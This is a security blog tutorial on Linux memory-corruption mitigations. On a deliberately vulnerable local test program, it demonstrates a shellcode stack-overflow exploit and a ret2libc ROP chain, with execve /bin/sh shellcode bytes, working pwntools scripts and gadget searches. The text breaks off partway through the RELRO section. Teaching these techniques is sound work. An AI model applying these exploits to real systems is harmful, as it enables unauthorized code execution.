			<description>Hi! Long time no see, huh? I must apologize for my lousy post schedule. In spite of covid-19 outbreak forcing us to stay home, it appears that I&amp;rsquo;ve never had less time to spare in my life. Well, let&amp;rsquo;s get to it.
Memory corruption issues often lead to pretty serious vulnerabilities. It is not uncommon for a stack or heap overflow, use-after-free, double free and others to lead to code execution.</description>
			<content type="html"><![CDATA[<p>Hi! Long time no see, huh? I must apologize for my lousy post schedule. In spite of covid-19 outbreak forcing us to stay home, it appears that I&rsquo;ve never had less time to spare in my life. Well, let&rsquo;s get to it.</p>
<p>Memory corruption issues often lead to pretty serious vulnerabilities. It is not uncommon for a stack or heap overflow, use-after-free, double free and others to lead to code execution. A few mitigations try to prevent this class of bugs from causing too much trouble, or at least to make the exploitation harder. Nevertheless, memory corruption is still a thing. Today we&rsquo;ll talk about these mitigations, how they work, how effective they are and how they are commonly bypassed.</p>
<h2 id="in-the-beginning">In the beginning&hellip;</h2>
<p>Back in the day memory corruption was a sure path towards code execution. There were no protections at all and a simple stack overflow was enough to make a flow hijack.</p>
<p>Nowadays when you use GCC to compile a simple C program, the binary will be generated protected as hell. Let&rsquo;s check it out:</p>
<p><strong>test.c</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#define SIZE 16
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">get_buffer</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">strout</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Please input a string (max length %d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">);</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">strout</span><span class="p">);</span> <span class="c1">//oh, shush
</span><span class="c1"></span><span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">SIZE</span><span class="p">];</span>
    <span class="n">get_buffer</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;The buffer is:</span><span class="se">\n</span><span class="s">%s&#34;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">└────╼ gcc test.c -o <span class="nb">test</span>
└────╼ checksec --file<span class="o">=</span><span class="nb">test</span>

RELRO           STACK CANARY      NX            PIE            
Full RELRO      Canary found      NX enabled    PIE enabled   
</code></pre></div><p>It has full RELRO, stack canary, NX and PIE. Not to mention that Linux will, by default, provide ASLR in runtime. (A little lost in these terms? No worries, we&rsquo;ll get over them in no time)</p>
<p>So let&rsquo;s rewind to the early days and deactivate all these memory protections. We&rsquo;ll enable them later and see how they affect exploitation.</p>
<pre><code>└────╼ gcc test.c -o test -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro
└────╼ checksec --file=test
RELRO           STACK CANARY      NX            PIE             
No RELRO        No canary found   NX disabled   No PIE
</code></pre><p>We compile our test file with no protections at all. I&rsquo;ll also deactivate ASLR protection on my box:</p>
<pre><code>└────╼ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre><p>Now we clearly have a stack overflow (or a stack out-of-bounds memory write, if you prefer). This program can be easily transformed into a terminal for code execution. If you have no idea how you can do this, <a href="https://mdanilor.github.io/posts/oscp-bof/">this</a> is a good place start. In that blog post we cracked an OSCP-like stack overflow on Windows. Here we use Linux. The tools are different, but the principles are the same.</p>
<p>Keep in mind that this is a mock test program, which will be used for our examples today. It runs locally, but you can (use your imagination and) picture it as if it was a server input, for example.</p>
<p>We now need to craft a shellcode (a code which will give us shell!) to trigger code execution.</p>
<h3 id="crafting-our-payload">Crafting our payload</h3>
<p>First we need a shellcode. There&rsquo;s no need to reinvent the wheel. <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">Here</a> we see a x64 shellcode we can use (thank you, shell-storm!).</p>
<p>The code of the shellcode may be seen below. Although assembly can be tough to understand at some times, I have added a few comments which might make it easier to grasp:</p>
<pre><code>    xor eax, eax ; Zeroes out eax
    mov rbx, 0xFF978CD091969DD1 ; this puts &quot;/bin/sh&quot; with a zero by the end. But it is actually negated (so one may put '\0' and not cause the program to think it is the end of the string)
    neg rbx ; Negates RBX
    push rbx ; pushes RBX to stack
    push rsp ; This instruction pushed RSP to the stack
    pop rdi ; And this instruction pops it to RDI. The stack points to the string &quot;/bin/sh&quot;. Now RDI points to &quot;/bin/sh&quot;.
    cdq ; Zeroes out RDX
    push rdx ; Pushes zero to the stack.
    push rdi ; Pushes RDI to stack, which is the pointer to the /bin/sh string.
    push rsp ; Pushes RSP and
    pop rsi ; pops into RSI. -&gt; rsi = rsp
    mov al, 0x3b ; execve syscall number.
    syscall ; SYSCALLS!
</code></pre><p>Basically what it does is call the <code>execve</code> syscall providing &ldquo;/bin/sh&rdquo; as argument.</p>
<p>And if we assemble this right (or just copy from shellstorm), we get the following bytes:</p>
<pre><code>\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
</code></pre><p>As this is not a stack overflow tutorial, I won&rsquo;t dive into too much details regarding the creation of our payload. Instead, I&rsquo;ll keep it breef. If you feel lost, I strongly recommend you look into the <a href="https://mdanilor.github.io/posts/oscp-bof/">OSCP-like stack overflow exploitation tutorial</a>.</p>
<p>I&rsquo;ll run the program and attach GDB to it. I&rsquo;ll also put a breakpoint in the main <code>ret</code> (or, rather, <code>retq</code>) instruction.</p>
<pre><code>(gdb) disass main
Dump of assembler code for function main:
   0x000000000040052d &lt;+0&gt;:	push   %rbp
   0x000000000040052e &lt;+1&gt;:	mov    %rsp,%rbp
   0x0000000000400531 &lt;+4&gt;:	sub    $0x20,%rsp
   0x0000000000400535 &lt;+8&gt;:	mov    %edi,-0x14(%rbp)
   0x0000000000400538 &lt;+11&gt;:	mov    %rsi,-0x20(%rbp)
   0x000000000040053c &lt;+15&gt;:	lea    -0x10(%rbp),%rax
   0x0000000000400540 &lt;+19&gt;:	mov    %rax,%rdi
   0x0000000000400543 &lt;+22&gt;:	callq  0x4004f7 &lt;get_buffer&gt;
   0x0000000000400548 &lt;+27&gt;:	lea    -0x10(%rbp),%rax
   0x000000000040054c &lt;+31&gt;:	mov    %rax,%rsi
   0x000000000040054f &lt;+34&gt;:	lea    0xc9(%rip),%rdi        # 0x40061f
   0x0000000000400556 &lt;+41&gt;:	mov    $0x0,%eax
   0x000000000040055b &lt;+46&gt;:	callq  0x4003f0 &lt;printf@plt&gt;
   0x0000000000400560 &lt;+51&gt;:	mov    $0x0,%eax
   0x0000000000400565 &lt;+56&gt;:	leaveq 
   0x0000000000400566 &lt;+57&gt;:	retq   
(gdb) b *0x0000000000400566
Breakpoint 3 at 0x400566
</code></pre><p>Now I&rsquo;ll send a bunch of &ldquo;A&quot;s to see if we can trigger anything.</p>
<pre><code>Please input a string (max length 16)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

</code></pre><p>And our breakpoint hits. Let&rsquo;s see what&rsquo;s in the stack.</p>
<pre><code>Thread 1 &quot;test&quot; hit Breakpoint 3, 0x0000000000400566 in main ()
(gdb) x/10x $rsp
0x7fffffffdda8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffddb8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffddc8:	0x41414141	0x41414141


</code></pre><p>So our payload is in the stack right before <code>retq</code> is called. <code>retq</code> is just a nickname for <code>pop rip</code>, which pops the stack to the instruction pointer and redirect the flow to the program. Since we control part of the stack, we can put our shellcode somewhere in there. But how would we trigger it?</p>
<p>Since the stack address will remain the same everytime we run the program, we can put the address for our payload right in <code>0x7fffffffdda8</code>. And our shellcode right after (<code>0x7fffffffddb0</code>). By doing some inspection (printing values in the stack), we find out that the region we control starts at <code>0x7fffffffdd90</code>.</p>
<p>How do I know this? Well, I used <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb">pattern</a>. But another way is by mere inspection:</p>
<pre><code>(gdb) x/10x $rsp-30
0x7fffffffdd8a:	0x00010040	0x41410000	0x41414141	0x41414141
0x7fffffffdd9a:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffddaa:	0x41414141	0x41414141
(gdb) x/10x $rsp-24
0x7fffffffdd90:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdda0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffddb0:	0x41414141	0x41414141
(gdb) x/10x $rsp-25
0x7fffffffdd8f:	0x41414100	0x41414141	0x41414141	0x41414141
0x7fffffffdd9f:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffddaf:	0x41414141	0x41414141

</code></pre><p>By inspection, we see that the stack pointer at the moment <code>retq</code> is called points to the position 24 of our buffer.</p>
<p>So we need a 24 byte long padding. This is what our payload will look like:</p>
<p><code>[24 bytes padding] + [address to our shellcode (0x7fffffffddb0)] + [shellcode]</code></p>
<p>Using python to build our payload and print it, or send it to a file, or call the program directly, we&rsquo;d have this:</p>
<pre><code>payload = &quot;A&quot;*24 + &quot;\xb0\xdd\xff\xff\xff\x7f\x00\x00\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
</code></pre><p>I&rsquo;ll write a python &ldquo;exploit&rdquo; for this using <a href="http://docs.pwntools.com/en/latest/">pwntools</a>:</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux')
payload = &quot;A&quot;*24 + &quot;\xb0\xdd\xff\xff\xff\x7f\x00\x00\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;

io = process(&quot;/home/danilo/tmp/test&quot;)
io.readline()
io.sendline(payload)
io.interactive()
</code></pre><p>What this code does is open the target program, read the &ldquo;Please input a string (max length 16)&rdquo; line, send our payload and open an interactive channel with the program. The result is a shell:</p>
<pre><code>└────╼ python3 exploit.py 
[+] Starting local process '/home/danilo/tmp/test': pid 20836
[*] Switching to interactive mode
The buffer is:
$ ls
exploit.py  test  test.c
$ pwd
/home/danilo/tmp
$ 

</code></pre><p>Great! So upon finding a buffer overflow, it is relatively easy to exploit it into code execution. Or at least it was a couple of decades ago. Now let&rsquo;s enable the protections and see how it goes.</p>
<p>In the next few sections I&rsquo;ll present each memory corruption mitigation. They are not in any specific order.</p>
<h2 id="stack-canary">Stack Canary</h2>
<p><img src="/posts/memory-mitigations-img/canary.jpeg" alt="Canary"></p>
<p>How cute are canaries?</p>
<p>Well, very cute. According to wikipedia, coal miners used canaries to detect if there was any toxic gases, such as carbon monoxide, in the workplace. Or a snitch: an informant who sings to the police. And they totally mitigate stack overflow vulnerabilities.</p>
<p>The issue with the program we wrote on the previous section was a stack overflow. That means we had a buffer in our stack on which we could write an arbitrary amount of data, even if it surpasses the designated size of the buffer. An adversary may overwrite other data in the memory, such as the return address, and make a flow hijack, leading to arbitrary code execution.</p>
<p>The stack canary is made to detect if the return address was overwritten and make it more difficult to make a flow hijack.</p>
<p>It works very simply, but also very elegantly. An 8 byte long semi-random integer is put before the return address in the stack (see the representation below). Before the function returns, it checks if the canary has been altered. If it hasn&rsquo;t, the flow continues gracefully. If it has, the program will crash. I said semi-random because not all bytes are random. There are 7 random bytes and a null byte ('\0&rsquo;). If an adversary has an out of bounds write, he or she will have to overwrite the canary to get to the return address. The null byte was chosen because it is the string terminator. An adversary should have trouble inputting a string with a null byte. In case of a memory leak, the null byte will act as the string terminator before the canary can be printed.</p>
<pre><code>+-----------------------+
|                       |
|         ...           |
|                       |
+-----------------------+
|                       |
|                       |
|                       |
|   Vulnerable buffer   |
|                       |
|                       |
|                       |
+-----------------------+
|                       |
|      Stack canary     |
+-----------------------+
|                       |
|     Return address    |
+-----------------------+
|                       |
|          ...          |
|                       |
|                       |
|                       |
|                       |
|                       |
|                       |
|                       |
|                       |
|                       |
|                       |
+-----------------------+

</code></pre><p>Let&rsquo;s recompile our binary, now removing the <code>-fno-stack-protector</code> option:</p>
<pre><code>gcc test.c -o test -z execstack -no-pie -Wl,-z,norelro
</code></pre><p>Now disassemble with gdb:</p>
<pre><code>└────╼ gdb ./test
(gdb) disass main
Dump of assembler code for function main:
   0x000000000040059d &lt;+0&gt;:	push   %rbp
   0x000000000040059e &lt;+1&gt;:	mov    %rsp,%rbp
   0x00000000004005a1 &lt;+4&gt;:	sub    $0x30,%rsp
   0x00000000004005a5 &lt;+8&gt;:	mov    %edi,-0x24(%rbp)
   0x00000000004005a8 &lt;+11&gt;:	mov    %rsi,-0x30(%rbp)
   0x00000000004005ac &lt;+15&gt;:	mov    %fs:0x28,%rax
   0x00000000004005b5 &lt;+24&gt;:	mov    %rax,-0x8(%rbp)
   0x00000000004005b9 &lt;+28&gt;:	xor    %eax,%eax
   0x00000000004005bb &lt;+30&gt;:	lea    -0x20(%rbp),%rax
   0x00000000004005bf &lt;+34&gt;:	mov    %rax,%rdi
   0x00000000004005c2 &lt;+37&gt;:	callq  0x400567 &lt;get_buffer&gt;
   0x00000000004005c7 &lt;+42&gt;:	lea    -0x20(%rbp),%rax
   0x00000000004005cb &lt;+46&gt;:	mov    %rax,%rsi
   0x00000000004005ce &lt;+49&gt;:	lea    0xda(%rip),%rdi        # 0x4006af
   0x00000000004005d5 &lt;+56&gt;:	mov    $0x0,%eax
   0x00000000004005da &lt;+61&gt;:	callq  0x400460 &lt;printf@plt&gt;
   0x00000000004005df &lt;+66&gt;:	mov    $0x0,%eax
   0x00000000004005e4 &lt;+71&gt;:	mov    -0x8(%rbp),%rdx
   0x00000000004005e8 &lt;+75&gt;:	xor    %fs:0x28,%rdx
   0x00000000004005f1 &lt;+84&gt;:	je     0x4005f8 &lt;main+91&gt;
   0x00000000004005f3 &lt;+86&gt;:	callq  0x400450 &lt;__stack_chk_fail@plt&gt;
   0x00000000004005f8 &lt;+91&gt;:	leaveq 
   0x00000000004005f9 &lt;+92&gt;:	retq   
End of assembler dump.
</code></pre><p>Here we see the assembly code of the main function. Note these lines specifically:</p>
<pre><code>...
   0x00000000004005ac &lt;+15&gt;:	mov    %fs:0x28,%rax
   0x00000000004005b5 &lt;+24&gt;:	mov    %rax,-0x8(%rbp)

...

   0x00000000004005e4 &lt;+71&gt;:	mov    -0x8(%rbp),%rdx
   0x00000000004005e8 &lt;+75&gt;:	xor    %fs:0x28,%rdx
   0x00000000004005f1 &lt;+84&gt;:	je     0x4005f8 &lt;main+91&gt;
   0x00000000004005f3 &lt;+86&gt;:	callq  0x400450 &lt;__stack_chk_fail@plt&gt;
   0x00000000004005f8 &lt;+91&gt;:	leaveq 
   0x00000000004005f9 &lt;+92&gt;:	retq   

</code></pre><p>In &lt;+15&gt; and &lt;+24&gt; it puts the canary in the position %rbp-0x8. Note that the canary will remain the same throughout all functions within the program.</p>
<p>Later on, on lines &lt;+71&gt;, &lt;+75&gt;, it loads the stored canary to %rdx and compares with the original value. If it is equal, (&lt;+84&gt;) meaning the canary hasn&rsquo;t been altered, it will jump to &lt;+91&gt; leaving the function gracefully. If it is not equal, the <code>__stack_chk_fail</code> function will be called, causing the program to crash:</p>
<pre><code>└────╼ ./test 
Please input a string (max length 16)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
The buffer is:
*** stack smashing detected ***: &lt;unknown&gt; terminated
Aborted (core dumped)
</code></pre><p>This mitigation kills the vulnerability here. However, note that canary is not a silver bullet (or a silver shield??). It only prevents adversaries from writing beyond the canary. Anything before the canary can be overwritten. It is also only effective on stack out of bounds write. There are many other memory corruption bug classes, such as use-after-free, arbitrary read, arbitrary write, double free, and others. Moreover, there is the possibility of a canary leak, but that would depend on a second vulnerability.</p>
<p>Summarizing, canaries offer a good protection against stack overflow vulnerabilities. A canary leak is a way to bypass this mitigation, but would depend on another vulnerability. The null-byte also mitigates for most part. However, it does not protect from other memory corruption vulnerabilities.</p>
<h2 id="nx">NX</h2>
<p>The NX (no-execute) bit is used to mark regions of memory as unexecutable. There&rsquo;s no reason for the stack or heap to be executed, for instance, since all the code is in the <code>.TEXT</code> region. With this protection enabled, adversaries need to get more creative to try and bypass the mitigation.</p>
<p>This mitigation also makes our payload useless, since it gets executed in the stack. If we put our payload, we get exit code -11 (SIGSEGV). But is there any bypass?</p>
<h3 id="ret2libc">Ret2libc</h3>
<p>Well, yes. It means we can&rsquo;t add new code to the program, but we can conveniently reuse code that is already in the program.</p>
<p>The return-to-libc technique is based on overwriting return addresses to point to gadgets in libc. Libc is enormous. There are gadgets to do pretty much anything there. For instance, there is the function <code>execve</code> previously used, which will set stuff up for calling the execve syscall.</p>
<p>But exploiting gets a bit trickier.</p>
<p>First, we deactivate the canary again and activate the NX protection:</p>
<pre><code>gcc test.c -o test -fno-stack-protector -no-pie -Wl,-z,norelro
</code></pre><p>To craft our new payload, we&rsquo;ll be using GDB with <a href="https://github.com/longld/peda">peda</a> plugin and <a href="https://github.com/Gallopsled/pwntools">pwntools</a> with python3.</p>
<p>The goal here is to reuse existing code to get where we want. We need to call the execve syscall. I have started the program and attached gdb to it. I&rsquo;ll use <code>disass execve</code> to get the address of the execve libc wrapper:</p>
<pre><code>gdb-peda$ disass execve
Dump of assembler code for function execve:
   0x00007ffff7ac6c00 &lt;+0&gt;:	mov    eax,0x3b
   0x00007ffff7ac6c05 &lt;+5&gt;:	syscall 
   0x00007ffff7ac6c07 &lt;+7&gt;:	cmp    rax,0xfffffffffffff001
   0x00007ffff7ac6c0d &lt;+13&gt;:	jae    0x7ffff7ac6c10 &lt;execve+16&gt;
   0x00007ffff7ac6c0f &lt;+15&gt;:	ret    
   0x00007ffff7ac6c10 &lt;+16&gt;:	mov    rcx,QWORD PTR [rip+0x306251]        # 0x7ffff7dcce68
   0x00007ffff7ac6c17 &lt;+23&gt;:	neg    eax
   0x00007ffff7ac6c19 &lt;+25&gt;:	mov    DWORD PTR fs:[rcx],eax
   0x00007ffff7ac6c1c &lt;+28&gt;:	or     rax,0xffffffffffffffff
   0x00007ffff7ac6c20 &lt;+32&gt;:	ret    
End of assembler dump.
</code></pre><p>Here we see that the address of <code>execve</code> function is <code>0x00007ffff7ac6c00</code>. We need to pass &ldquo;/bin/bash&rdquo; as argument to that syscall, so it opens the terminal (which is our goal here). To do that, we need to set the <code>rdi</code> register to point to &ldquo;/bin/bash&rdquo; string. In addition, <code>rsi</code> register should be zero. You may be wondering how do I know that. Well, I have checked <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux System Call table</a>.</p>
<p>To correctly set the values for these two registers we need gadgets. Gadgets are parts of existing binary code which we can use to get the desired effect.</p>
<p>We need to set <code>rdi</code> register to &ldquo;/bin/bash&rdquo;. We can put the string in the stack and use a <code>pop rdi;ret</code> gadget to load the address to <code>rdi</code>.</p>
<p>Fortunately, libc is gigantic and have enough gadgets so we can do anything we want. And peda will make it very easy to find these gadgets. First let&rsquo;s see how our payload will be:</p>
<p><code>padding + pop rdi; ret; + rdi value (pointer to &quot;/bin/bash&quot; string) + pop rsi; ret + rsi value (zero!) + execve addr + &quot;/bin/sh&quot;</code></p>
<p>It starts with the 24 byte long padding. Then, we&rsquo;ll set the value of <code>rdi</code> to point to &ldquo;/bin/sh&rdquo; string. Then we&rsquo;ll zero <code>rsi</code> out. After that, <code>execve</code> addr will be put and, finally, the &ldquo;/bin/sh&rdquo; string.</p>
<p>To find our gadgets, we&rsquo;ll use peda:</p>
<pre><code>gdb-peda$ ropsearch &quot;pop rdi; ret&quot; libc
Searching for ROP gadget: 'pop rdi; ret' in: libc ranges
0x00007ffff7a035bf : (b'5fc3')	pop rdi; ret
0x00007ffff7a044ae : (b'5fc3')	pop rdi; ret
0x00007ffff7a04c37 : (b'5fc3')	pop rdi; ret
0x00007ffff7a04cbe : (b'5fc3')	pop rdi; ret
0x00007ffff7a05bd2 : (b'5fc3')	pop rdi; ret
0x00007ffff7a05f4b : (b'5fc3')	pop rdi; ret
0x00007ffff7a072e7 : (b'5fc3')	pop rdi; ret
0x00007ffff7a077ce : (b'5fc3')	pop rdi; ret
0x00007ffff7a07ce6 : (b'5fc3')	pop rdi; ret
0x00007ffff7a08260 : (b'5fc3')	pop rdi; ret
0x00007ffff7a088b9 : (b'5fc3')	pop rdi; ret
0x00007ffff7a08b81 : (b'5fc3')	pop rdi; ret
0x00007ffff7a09647 : (b'5fc3')	pop rdi; ret
0x00007ffff7a0a677 : (b'5fc3')	pop rdi; ret
0x00007ffff7a0b79c : (b'5fc3')	pop rdi; ret
0x00007ffff7a0be84 : (b'5fc3')	pop rdi; ret
0x00007ffff7a0ca1f : (b'5fc3')	pop rdi; ret
0x00007ffff7a0d0cc : (b'5fc3')	pop rdi; ret
0x00007ffff7a0dbcc : (b'5fc3')	pop rdi; ret
0x00007ffff7a0e198 : (b'5fc3')	pop rdi; ret
0x00007ffff7a0e261 : (b'5fc3')	pop rdi; ret
0x00007ffff7a0ef59 : (b'5fc3')	pop rdi; ret
0x00007ffff7a0f204 : (b'5fc3')	pop rdi; ret
0x00007ffff7a102d3 : (b'5fc3')	pop rdi; ret
0x00007ffff7a10307 : (b'5fc3')	pop rdi; ret
--More--(25/489)
</code></pre><p>It has found 489 occurrences of &ldquo;pop rdi; ret&rdquo; in libc which we can use. Any one will do. I&rsquo;ll use <code>0x00007ffff7a035bf</code> to craft my payload.</p>
<p>Now the other gadget:</p>
<pre><code>gdb-peda$ ropsearch &quot;pop rsi; ret&quot; libc
Searching for ROP gadget: 'pop rsi; ret' in: libc ranges
0x00007ffff7a05eea : (b'5ec3')	pop rsi; ret
0x00007ffff7a12097 : (b'5ec3')	pop rsi; ret
0x00007ffff7a229da : (b'5ec3')	pop rsi; ret
0x00007ffff7a40854 : (b'5ec3')	pop rsi; ret
0x00007ffff7a461b3 : (b'5ec3')	pop rsi; ret
0x00007ffff7a4d1c5 : (b'5ec3')	pop rsi; ret
0x00007ffff7a5e8a4 : (b'5ec3')	pop rsi; ret
0x00007ffff7a60e93 : (b'5ec3')	pop rsi; ret
0x00007ffff7a60ecb : (b'5ec3')	pop rsi; ret
0x00007ffff7a62ede : (b'5ec3')	pop rsi; ret
0x00007ffff7a640d4 : (b'5ec3')	pop rsi; ret
0x00007ffff7a641b8 : (b'5ec3')	pop rsi; ret
0x00007ffff7a64fc9 : (b'5ec3')	pop rsi; ret
0x00007ffff7a66fa6 : (b'5ec3')	pop rsi; ret
0x00007ffff7a66ff1 : (b'5ec3')	pop rsi; ret
0x00007ffff7a69c62 : (b'5ec3')	pop rsi; ret
0x00007ffff7a6a6e0 : (b'5ec3')	pop rsi; ret
0x00007ffff7a6aa17 : (b'5ec3')	pop rsi; ret
0x00007ffff7a6aac0 : (b'5ec3')	pop rsi; ret
0x00007ffff7a6aaf6 : (b'5ec3')	pop rsi; ret
0x00007ffff7a6b32f : (b'5ec3')	pop rsi; ret
0x00007ffff7a6bd09 : (b'5ec3')	pop rsi; ret
0x00007ffff7a6c138 : (b'5ec3')	pop rsi; ret
0x00007ffff7a6e5ee : (b'5ec3')	pop rsi; ret
0x00007ffff7a6f246 : (b'5ec3')	pop rsi; ret
--More--(25/149)
</code></pre><p>149 occurrences. Again, any one will do. I&rsquo;ll use <code>0x00007ffff7a05eea</code>.</p>
<p>Ok, so we refine our stack payload:</p>
<p><code>24 byte long padding + 0x00007ffff7a035bf + STACK ADDRESS FOR &quot;/bin/sh&quot; STRING + 0x00007ffff7a05eea + 0 + 0x00007ffff7ac6c00 + &quot;/bin/sh&quot;</code></p>
<p>All that&rsquo;s left to do is find out the stack addr for &ldquo;/bin/sh&rdquo;. Gdb can do that for us. I&rsquo;ll prepare the payload without the stack address (will put some garbage instead), send the payload, and see where the string hits. Check the &ldquo;<em>exploit</em>&rdquo; out:</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux')
addr_execve = 0x00007ffff7ac6c00 # execve
addr_poprdi_ret = 0x00007ffff7a035bf # pop rdi; ret
addr_poprsi_ret = 0x00007ffff7a05eea # pop rsi; ret
addr_binsh_str = 0xdeadbeefdeadbeef

payload = b&quot;A&quot;*24 + pack(addr_poprdi_ret) + pack(addr_binsh_str) + pack(addr_poprsi_ret) + pack(0) +  pack(addr_execve) + b&quot;/bin/bash&quot; 

io = process(&quot;/home/danilo/tmp/test&quot;)

raw_input() # This will stop the program in time so we can attach gdb. 

io.readline()
io.sendline(payload)
io.interactive()
</code></pre><p>We can run it and attach gdb. A breakpoint will be put in the main return instruction.</p>
<pre><code>gdb-peda$ disass main
Dump of assembler code for function main:
   0x000000000040052d &lt;+0&gt;:	push   rbp
   0x000000000040052e &lt;+1&gt;:	mov    rbp,rsp
   0x0000000000400531 &lt;+4&gt;:	sub    rsp,0x20
   0x0000000000400535 &lt;+8&gt;:	mov    DWORD PTR [rbp-0x14],edi
   0x0000000000400538 &lt;+11&gt;:	mov    QWORD PTR [rbp-0x20],rsi
   0x000000000040053c &lt;+15&gt;:	lea    rax,[rbp-0x10]
   0x0000000000400540 &lt;+19&gt;:	mov    rdi,rax
   0x0000000000400543 &lt;+22&gt;:	call   0x4004f7 &lt;get_buffer&gt;
   0x0000000000400548 &lt;+27&gt;:	lea    rax,[rbp-0x10]
   0x000000000040054c &lt;+31&gt;:	mov    rsi,rax
   0x000000000040054f &lt;+34&gt;:	lea    rdi,[rip+0xc9]        # 0x40061f
   0x0000000000400556 &lt;+41&gt;:	mov    eax,0x0
   0x000000000040055b &lt;+46&gt;:	call   0x4003f0 &lt;printf@plt&gt;
   0x0000000000400560 &lt;+51&gt;:	mov    eax,0x0
   0x0000000000400565 &lt;+56&gt;:	leave  
   0x0000000000400566 &lt;+57&gt;:	ret    
End of assembler dump.
gdb-peda$ br *0x0000000000400566
Breakpoint 1 at 0x400566
gdb-peda$ c
</code></pre><pre><code>Thread 1 &quot;test&quot; hit Breakpoint 1, 0x0000000000400566 in main ()
gdb-peda$ x/10x $rsp
0x7fffffffdda8:	0x00007ffff7a035bf	0xdeadbeefdeadbeef
0x7fffffffddb8:	0x00007ffff7a05eea	0x0000000000000000
0x7fffffffddc8:	0x00007ffff7ac6c00	0x7361622f6e69622f
0x7fffffffddd8:	0xd1b02fd71f9c0068	0x0000000000400410
0x7fffffffdde8:	0x00007fffffffde80	0x0000000000000000
</code></pre><p>Looks like we found our target. And it is in address  <code>0x7fffffffddd0</code>:</p>
<pre><code>gdb-peda$ x/s 0x7fffffffddd0
0x7fffffffddd0:	&quot;/bin/bash&quot;
</code></pre><p>So our final exploit is:</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux')
addr_execve = 0x00007ffff7ac6c00 # execve
addr_poprdi_ret = 0x00007ffff7a035bf # pop rdi; ret
addr_poprsi_ret = 0x00007ffff7a05eea # pop rsi; ret
addr_binsh_str = 0x7fffffffddd0

payload = b&quot;A&quot;*24 + pack(addr_poprdi_ret) + pack(addr_binsh_str) + pack(addr_poprsi_ret) + pack(0) +  pack(addr_execve) + b&quot;/bin/bash&quot; 

io = process(&quot;/home/danilo/tmp/test&quot;)
raw_input()
io.readline()
io.sendline(payload)
io.interactive()

</code></pre><p>And the result:</p>
<pre><code>└────╼ python3 exploit.py 
[+] Starting local process '/home/danilo/tmp/test': pid 15432

[*] Switching to interactive mode
The buffer is:
$ whoami
danilo
$ 
</code></pre><p>Very nice! We managed to make a flow hijack to get a terminal using libc gadgets.</p>
<h2 id="aslr">ASLR</h2>
<p>Address Space Layout Randomization, or ASLR for short, would kill the technique used in the previous section. As the name implies, it randomizes the address space layout. This means that each time you run the program, the stack and heap will be in a different addresses. And libc (and all other libs used) will also be in different random addresses.</p>
<p>This kills our previous approach, since we relied on libc gadgets (and now we don&rsquo;t know where they are) and on knowing the stack address (which will be different on every execution).</p>
<p>Or does it?</p>
<h3 id="bypassing-aslr">Bypassing ASLR?</h3>
<p>There are two main ways to bypass ASLR. The first is leaking a libc address. If one single libc function address is leaked, we can calculate the offset and find out where all the gadgets are! However, that would depend on a second vulnerability to leak the address. This is not extremely improbable, but will not happen in our silly example.</p>
<p>The other relies on reusing only the program code. The .TEXT section will not be randomized in ASLR, so we have our entire program to find gadgets. Our silly example is not that long, meaning we won&rsquo;t find many useful gadgets there.</p>
<p>It&rsquo;s a shame that we will not demonstrate ASLR bypass in this post. However, I&rsquo;ll make room for one in the future. (Actually, I have been writting one for a while now and should be out soon.)</p>
<h2 id="relro">RELRO</h2>
<p>Before talking about RELRO, first a word or two must be spoken on Procedure Linkage Table (PLT) and Global Offset Table (GOT). In our program we call the libc functions &ldquo;printf&rdquo; and &ldquo;gets&rdquo;. If ASLR is disabled, these libc functions will always have the same address, as may be seen with the use of <code>ldd</code> program:</p>
<pre><code>└────╼ ldd test
	linux-vdso.so.1 (0x00007ffff7ffa000)
	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
└────╼ ldd test
	linux-vdso.so.1 (0x00007ffff7ffa000)
